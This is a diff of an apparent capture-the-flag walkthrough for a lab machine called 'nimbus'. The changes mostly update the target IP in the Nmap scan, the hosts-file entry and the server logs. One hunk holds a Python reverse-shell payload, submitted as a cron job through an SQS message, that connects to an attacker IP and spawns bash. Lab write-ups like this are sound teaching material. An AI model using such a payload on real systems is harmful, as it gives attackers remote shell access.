@@ -23,7 +23,7 @@ tags:
 image: assets/nimbus/nimbus_banner.png
 ---
 
-Target IP: **10.129.19.103**
+Target IP: **10.129.173.194**
 
 ## Executive Summary
 
@@ -44,7 +44,7 @@ Target IP: **10.129.19.103**
 The engagement starts with a standard Nmap scan to identify exposed services on the target.
 
 ```shell title="Nmap Scan"
-nmap -sC -sV -T4 -oA reports/nimbus_ 10.129.19.103
+nmap -sC -sV -T4 -oA reports/nimbus_ 10.129.173.194
 ```
 
 ```text title="Nmap Output"
@@ -66,10 +66,10 @@ The scan identifies two services:
  - **Port 22 (SSH):** Running `OpenSSH 9.6p1`.
  - **Port 80 (HTTP):** Running `nginx 1.24.0`.
 
-Navigating to `http://10.129.19.103` immediately redirects us to `http://nimbus.htb/`. To resolve this domain, we must add it to our local `/etc/hosts` file.
+Navigating to `http://10.129.173.194` immediately redirects us to `http://nimbus.htb/`. To resolve this domain, we must add it to our local `/etc/hosts` file.
 
 ```shell title="Update Hosts File"
-echo "10.129.19.103   nimbus.htb" | sudo tee -a /etc/hosts
+echo "10.129.173.194   nimbus.htb" | sudo tee -a /etc/hosts
 ```
 
 ## 2. Web Enumeration
@@ -123,7 +123,7 @@ curl -X POST http://nimbus.htb/jobs/preview \
 Watching our local Python HTTP server, we see the incoming request, confirming the backend is actively fetching external URLs.
 
 ```text title="Local Python Web Server"
-10.129.19.103 - - [21/Jun/2026 04:12:16] "GET /probe.yaml HTTP/1.1" 200 -
+10.129.173.194 - - [21/Jun/2026 04:12:16] "GET /probe.yaml HTTP/1.1" 200 -
 ```
 
 ### SSRF Filter Bypass
@@ -239,7 +239,7 @@ aws --endpoint-url http://aws.nimbus.htb sqs send-message \
     "name": "reverse_shell",
     "schedule": "* * * * *",
     "runtime": "python3.11",
-    "script": "import os, pty, socket; s = socket.socket(); s.connect((\"<VPN_IP>\", 4444)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(\"/bin/bash\")"
+    "script": "import os, pty, socket; s = socket.socket(); s.connect((\"10.10.14.71\", 4444)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(\"/bin/bash\")"
   }'
 ```
 
